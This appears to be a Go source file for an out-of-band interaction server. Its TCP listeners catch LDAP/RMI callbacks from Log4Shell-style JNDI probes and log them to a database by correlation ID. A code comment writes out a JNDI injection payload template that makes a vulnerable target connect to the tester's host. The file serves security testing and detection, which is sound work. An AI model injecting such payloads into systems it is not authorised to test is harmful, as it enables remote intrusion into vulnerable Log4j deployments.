package oob

import (
	"encoding/hex"
	"fmt"
	"log/slog"
	"net"
	"regexp"
	"strings"
	"time"

	"gorm.io/gorm"

	"github.com/analysishub/backend/internal/models"
)

// JNDI (Log4Shell-style) callback catchers. A payload such as
//
//	${jndi:ldap://<OOB_DOMAIN>:1389/<corr><unique>}
//
// makes the target connect to our LDAP/RMI port; the correlation id rides in the
// path/DN, which appears in plaintext in the request bytes, so we recover it by
// scanning. The DNS lookup that precedes the connection is already recorded —
// this adds the confirming second-stage connection. Best-effort: unknown
// correlations are dropped. A semaphore bounds concurrent handlers.

var (
	corrCandidate = regexp.MustCompile(`[a-z0-9]{20,}`)
	tcpCatchSem   = make(chan struct{}, 64)
)

func (s *Server) startTCPCatch(port, proto string) {
	if port == "" || port == "0" {
		return
	}
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		slog.Error("oob "+proto+" listen", "err", err)
		return
	}
	s.tcpLns = append(s.tcpLns, ln)
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return // listener closed
			}
			select {
			case tcpCatchSem <- struct{}{}:
				go func() {
					defer func() { <-tcpCatchSem }()
					s.handleTCPCatch(conn, proto)
				}()
			default:
				conn.Close() // saturated — drop
			}
		}
	}()
	s.addListener(proto + " :" + port)
}

func (s *Server) handleTCPCatch(conn net.Conn, proto string) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))

	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	data := buf[:n]

	corr, uniq, ok := scanCorrelation(strings.ToLower(string(data)), func(c string) bool {
		var client models.OobClient
		return s.db.Where("correlation_id = ?", c).Select("id").First(&client).Error == nil
	})
	if !ok {
		return // no known correlation in the payload — ignore noise
	}

	var client models.OobClient
	if s.db.Where("correlation_id = ?", corr).First(&client).Error != nil {
		return
	}

	remote := conn.RemoteAddr().String()
	in := models.OobInteraction{
		ClientID:      client.ID,
		CorrelationID: corr,
		UniqueID:      uniq,
		Protocol:      proto,
		FullHost:      "",
		RemoteAddr:    remote,
		RawRequest:    fmt.Sprintf("%s connection from %s\n%s", strings.ToUpper(proto), remote, hexPreview(data)),
		CreatedAt:     time.Now(),
	}
	if host, _, err := net.SplitHostPort(remote); err == nil {
		in.RemoteIP = host
	} else {
		in.RemoteIP = remote
	}

	if err := s.db.Create(&in).Error; err != nil {
		slog.Error("oob: persist tcp interaction", "err", err)
		return
	}
	now := time.Now()
	s.db.Model(&models.OobClient{}).Where("id = ?", client.ID).Updates(map[string]interface{}{
		"interaction_count": gorm.Expr("interaction_count + 1"),
		"last_seen_at":      now,
	})
	EnrichInteraction(s.db, in.ID, in.RemoteIP)
	if s.hub != nil {
		s.hub.Publish(client.ID, in)
	}
	slog.Info("oob interaction", "proto", proto, "from", in.RemoteIP)
}

// scanCorrelation finds the first 20+ char lowercase-alnum run whose leading
// CorrelationLen chars resolve to a known client (via the `known` callback).
func scanCorrelation(s string, known func(string) bool) (corr, uniq string, ok bool) {
	for _, cand := range corrCandidate.FindAllString(s, -1) {
		if len(cand) < CorrelationLen {
			continue
		}
		c := cand[:CorrelationLen]
		if known(c) {
			return c, cand[CorrelationLen:], true
		}
	}
	return "", "", false
}

func hexPreview(b []byte) string {
	if len(b) > 512 {
		b = b[:512]
	}
	return hex.Dump(b)
}
